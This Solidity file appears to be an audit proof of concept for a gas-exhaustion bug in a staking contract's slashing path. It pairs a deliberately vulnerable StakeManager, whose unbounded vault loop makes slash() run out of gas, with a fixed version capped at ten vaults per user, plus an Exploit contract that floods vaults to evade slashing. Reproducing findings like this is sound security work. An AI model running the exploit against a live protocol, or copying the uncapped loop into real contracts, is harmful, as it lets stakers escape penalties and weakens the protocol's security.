// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Status Network L2 staking finding
// 65322: "Any staker can fully avoid slashing by triggering OOG reverts".
//
// Root cause (verbatim, from status-im/status-network-monorepo,
// status-network-contracts/src/StakeManager.sol, audited state = fix commit
// 6697432b862ee515d1783941a78d07e9a91991eb PARENT):
//
//   * StakeManager iterates over EVERY vault an account owns to aggregate the
//     account's redeemable rewards (the loop reproduced verbatim below). This
//     aggregation is what a slash reads (Karma.slash -> _balanceOf ->
//     rewardsBalanceOfAccount) to compute the account's slashable balance.
//   * VaultFactory.createVault() is permissionless and, in the audited state,
//     StakeManager.registerVault() had NO per-user vault limit
//     (`maxVaultsPerUser` was added by the fix commit above). A staker can
//     therefore register an unbounded number of vaults.
//
// Consequence: a staker pre-registers thousands of vaults. The unbounded loop
// then consumes more gas than a whole block, so `slash()` ALWAYS runs out of
// gas and reverts. The protocol can never seize that staker's slashable stake —
// the staker fully evades slashing.
//
// This file inlines the verbatim vulnerable loop (`rewardsBalanceOf` +
// `rewardsBalanceOfAccount`, with the exact `VaultData` struct and
// `_vaultPendingRewards` shape), an uncapped permissionless `createVault()`
// (the audited state), and a `slash()` that gates the stake seizure on that
// aggregation loop (matching Karma.slash -> _balanceOf -> rewardsBalanceOfAccount).
// The per-iteration gas is the REAL cost of the per-vault cold storage reads the
// loop performs — nothing is artificially burned.
//
// `StakeManagerFixed` is the negative control: it applies the recommended fix
// (a `maxVaultsPerUser = 10` cap on registration), under which the same
// gas-capped slash succeeds and the stake is seized.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double used only as a harm MARKER: it records the
///      magnitude of slashable stake the protocol FAILED to seize.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE StakeManager (audited state, pre-fix): uncapped permissionless
// vault registration + unbounded reward-aggregation loop that slash() depends on.
// ─────────────────────────────────────────────────────────────────────────────
contract StakeManager {
    // Verbatim VaultData struct from StakeManager.sol.
    struct VaultData {
        uint256 stakedBalance;
        uint256 rewardIndex;
        uint256 mpAccrued;
        uint256 maxMP;
        uint256 lastMPUpdateTime;
        uint256 rewardsAccrued;
    }

    uint256 internal constant SCALE_FACTOR = 1e18;

    mapping(address account => address[]) public vaults; // accountVaults
    mapping(address vault => VaultData) public vaultData;
    mapping(address vault => address owner) public vaultOwners;
    uint256 public globalRewardIndex; // stands in for _rewardIndex()

    // Slashing accounting.
    mapping(address account => uint256) public slashableStake;
    mapping(address account => bool) public slashed;
    uint256 public totalSeized;

    error StakeManager__VaultAlreadyRegistered();

    /// @notice Test helper: set the stake a slash is meant to seize.
    function setSlashableStake(address account, uint256 amount) external {
        slashableStake[account] = amount;
    }

    /**
     * @notice Permissionless vault creation (models VaultFactory.createVault()).
     * @dev Audited state: registration enforced NO per-user vault limit, so any
     *      staker can append an unbounded number of vaults to their account.
     */
    function createVault() external returns (address vault) {
        // Deterministic fresh vault address (the real code deploys a StakeVault
        // clone; the loop only ever reads vaultData keyed by this address, so the
        // clone's code is not on the exploit path and is elided).
        vault = address(uint160(uint256(keccak256(abi.encode(msg.sender, vaults[msg.sender].length, address(this))))));
        _registerVault(vault, msg.sender);
    }

    function _registerVault(address vault, address owner) internal {
        if (vaultOwners[vault] != address(0)) {
            revert StakeManager__VaultAlreadyRegistered();
        }
        // @> AUDITED STATE: no `maxVaultsPerUser` cap here — attacker can register unbounded vaults
        vaultOwners[vault] = owner;
        vaults[owner].push(vault);
    }

    /**
     * @notice Returns the rewards balance of a vault. (verbatim)
     */
    function rewardsBalanceOf(address vaultAddress) public view returns (uint256) {
        VaultData storage vault = vaultData[vaultAddress];
        return vault.rewardsAccrued + _vaultPendingRewards(vault);
    }

    function _vaultPendingRewards(VaultData storage vault) internal view returns (uint256) {
        uint256 newRewardIndex = globalRewardIndex;
        uint256 accountShares = vault.stakedBalance + vault.mpAccrued;
        uint256 deltaRewardIndex = newRewardIndex - vault.rewardIndex;
        return (accountShares * deltaRewardIndex) / SCALE_FACTOR;
    }

    /**
     * @notice Returns the rewards balance of an account. (verbatim loop)
     * @dev Iterates over all vaults owned by the account and sums the rewards.
     */
    function rewardsBalanceOfAccount(address account) public view returns (uint256) {
        address[] memory accountVaults = vaults[account];
        uint256 accountTotalRewards = 0;

        for (uint256 i = 0; i < accountVaults.length; i++) {
            accountTotalRewards += rewardsBalanceOf(accountVaults[i]); // @> unbounded loop over attacker-controlled accountVaults → slash() OOGs (slash DoS/evasion)
        }
        return accountTotalRewards;
    }

    /**
     * @notice Slash an account (models Karma.slash -> _balanceOf ->
     *         IRewardDistributor.rewardsBalanceOfAccount, then seize the stake).
     * @dev The slashable balance is gated on the UNBOUNDED aggregation loop; if
     *      that loop runs out of gas, the whole slash reverts and no stake is
     *      seized.
     */
    function slash(address account) external {
        // _balanceOf: aggregate per-vault rewards across ALL of the account's
        // vaults — this is the unbounded, attacker-controlled loop.
        uint256 externalBalance = rewardsBalanceOfAccount(account);
        uint256 balance = slashableStake[account] + externalBalance;
        require(balance > 0, "nothing to slash");

        // Penalty: seize the account's slashable stake.
        uint256 amountToSlash = slashableStake[account];
        slashableStake[account] = 0;
        slashed[account] = true;
        totalSeized += amountToSlash;
    }

    function vaultCountOf(address account) external view returns (uint256) {
        return vaults[account].length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED StakeManager (negative control): recommended mitigation — cap the number
// of vaults a user can register (i.e. 10). The aggregation loop is then bounded,
// so the same gas-capped slash succeeds and the stake is seized.
// ─────────────────────────────────────────────────────────────────────────────
contract StakeManagerFixed {
    struct VaultData {
        uint256 stakedBalance;
        uint256 rewardIndex;
        uint256 mpAccrued;
        uint256 maxMP;
        uint256 lastMPUpdateTime;
        uint256 rewardsAccrued;
    }

    uint256 internal constant SCALE_FACTOR = 1e18;
    uint256 public constant maxVaultsPerUser = 10; // FIX: the recommended per-user vault limit

    mapping(address account => address[]) public vaults;
    mapping(address vault => VaultData) public vaultData;
    mapping(address vault => address owner) public vaultOwners;
    uint256 public globalRewardIndex;

    mapping(address account => uint256) public slashableStake;
    mapping(address account => bool) public slashed;
    uint256 public totalSeized;

    error StakeManager__VaultAlreadyRegistered();
    error StakeManager__MaxVaultsPerUserReached();

    function setSlashableStake(address account, uint256 amount) external {
        slashableStake[account] = amount;
    }

    function createVault() external returns (address vault) {
        vault = address(uint160(uint256(keccak256(abi.encode(msg.sender, vaults[msg.sender].length, address(this))))));
        _registerVault(vault, msg.sender);
    }

    function _registerVault(address vault, address owner) internal {
        // FIX: enforce a sensible per-user vault limit.
        if (vaults[owner].length >= maxVaultsPerUser) {
            revert StakeManager__MaxVaultsPerUserReached();
        }
        if (vaultOwners[vault] != address(0)) {
            revert StakeManager__VaultAlreadyRegistered();
        }
        vaultOwners[vault] = owner;
        vaults[owner].push(vault);
    }

    function rewardsBalanceOf(address vaultAddress) public view returns (uint256) {
        VaultData storage vault = vaultData[vaultAddress];
        return vault.rewardsAccrued + _vaultPendingRewards(vault);
    }

    function _vaultPendingRewards(VaultData storage vault) internal view returns (uint256) {
        uint256 newRewardIndex = globalRewardIndex;
        uint256 accountShares = vault.stakedBalance + vault.mpAccrued;
        uint256 deltaRewardIndex = newRewardIndex - vault.rewardIndex;
        return (accountShares * deltaRewardIndex) / SCALE_FACTOR;
    }

    function rewardsBalanceOfAccount(address account) public view returns (uint256) {
        address[] memory accountVaults = vaults[account];
        uint256 accountTotalRewards = 0;
        for (uint256 i = 0; i < accountVaults.length; i++) {
            accountTotalRewards += rewardsBalanceOf(accountVaults[i]);
        }
        return accountTotalRewards;
    }

    function slash(address account) external {
        uint256 externalBalance = rewardsBalanceOfAccount(account);
        uint256 balance = slashableStake[account] + externalBalance;
        require(balance > 0, "nothing to slash");
        uint256 amountToSlash = slashableStake[account];
        slashableStake[account] = 0;
        slashed[account] = true;
        totalSeized += amountToSlash;
    }

    function vaultCountOf(address account) external view returns (uint256) {
        return vaults[account].length;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the attacker floods the registry with vaults, then a slash
// attempt (capped at a realistic block gas limit) OOGs — so the attacker's
// slashable stake is never seized. The evaded stake magnitude is recorded on a
// MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant SLASHABLE = 1000 ether; // stake the protocol wants to seize
    uint256 internal constant N_BIG = 6000; // attacker-registered vaults (unbounded in practice)
    uint256 internal constant GAS_CAP = 30_000_000; // models the L1/L2 block gas limit

    StakeManager public sm;
    MiniToken public marker;

    // Exposed results for the driver to assert on.
    address public smAddr;
    address public markerAddr;
    uint256 public vaultCount;
    bool public slashCallSucceeded;
    uint256 public slashableRemaining;
    bool public wasSlashed;
    uint256 public sinkMarkerBalance;

    function run() external payable {
        sm = new StakeManager(); // nonce 1
        marker = new MiniToken("Locked Slashable Stake", "LOCKED-STAKE"); // nonce 2
        smAddr = address(sm);
        markerAddr = address(marker);

        // Attacker has slashable stake the protocol intends to seize.
        sm.setSlashableStake(address(this), SLASHABLE);

        // Attacker floods the registry with vaults via the permissionless,
        // uncapped createVault() path.
        for (uint256 i = 0; i < N_BIG; i++) {
            sm.createVault();
        }
        vaultCount = sm.vaultCountOf(address(this));

        // Slash attempt, capped at a realistic block gas limit: the unbounded
        // aggregation loop exceeds the cap and the whole slash OOG-reverts.
        (bool ok,) = address(sm).call{ gas: GAS_CAP }(abi.encodeWithSelector(StakeManager.slash.selector, address(this)));
        slashCallSucceeded = ok;

        // HARM: the slash failed; the attacker's slashable stake is untouched.
        slashableRemaining = sm.slashableStake(address(this));
        wasSlashed = sm.slashed(address(this));

        require(!ok, "slash unexpectedly succeeded within the block gas limit");
        require(slashableRemaining == SLASHABLE, "stake was seized despite the flood");
        require(!wasSlashed, "account was slashed despite the flood");

        // Record the evaded / un-seized stake magnitude on the marker to the SINK.
        marker.mint(SINK, SLASHABLE);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
